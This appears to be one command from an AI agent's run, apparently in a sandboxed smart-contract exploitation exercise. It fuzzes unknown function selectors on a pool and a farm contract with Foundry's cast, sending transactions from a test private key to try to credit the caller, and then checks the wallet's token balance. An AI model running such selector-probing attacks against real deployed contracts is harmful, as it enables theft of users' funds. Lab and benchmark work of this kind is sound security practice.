command:
/bin/bash -lc 'RPC=http://container1-6bd7e94e-b413-4478-9f01-a55d5f1cba90:8757; PK=0x0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef; ME=0xFCAd0B19bB29D4674531d6f115237E16AfCE377c; POOL=0xa71645EbB6d8B889D69b1915f82cE28072A341d6; FARM=0xc8B533575f5b53b5515D6DDc95CBf002cD2F2182; TOKEN=<redacted>;
for sel in 0xcc1f97cf; do 
  echo "POOL $sel addr"; cast send $POOL "$sel(address)" $ME --private-key $PK --rpc-url $RPC --legacy --gas-limit 300000 --json 2>/dev/null || true; 
  echo "POOL $sel uint"; cast send $POOL "$sel(uint256)" 1 --private-key $PK --rpc-url $RPC --legacy --gas-limit 300000 --json 2>/dev/null || true; 
  echo "POOL $sel addr,uint"; cast send $POOL "$sel(address,uint256)" $ME 1 --private-key $PK --rpc-url $RPC --legacy --gas-limit 300000 --json 2>/dev/null || true; 
  echo "POOL $sel uint,address"; cast send $POOL "$sel(uint256,address)" 1 $ME --private-key $PK --rpc-url $RPC --legacy --gas-limit 300000 --json 2>/dev/null || true; 
 done
for sel in 0x41079fce 0x88cb6632 0x96da9bd5 0x9555f4c3; do 
  echo "FARM $sel addr"; cast send $FARM "$sel(address)" $ME --private-key $PK --rpc-url $RPC --legacy --gas-limit 300000 --json 2>/dev/null || true; 
  echo "FARM $sel uint"; cast send $FARM "$sel(uint256)" 1 --private-key $PK --rpc-url $RPC --legacy --gas-limit 300000 --json 2>/dev/null || true; 
  echo "FARM $sel addr,uint"; cast send $FARM "$sel(address,uint256)" $ME 1 --private-key $PK --rpc-url $RPC --legacy --gas-limit 300000 --json 2>/dev/null || true; 
  echo "FARM $sel uint,address"; cast send $FARM "$sel(uint256,address)" 1 $ME --private-key $PK --rpc-url $RPC --legacy --gas-limit 300000 --json 2>/dev/null || true; 
 done
echo '"'wallet token'; cast call "'$TOKEN '"'balanceOf(address)(uint256)' "'$ME --rpc-url $RPC'

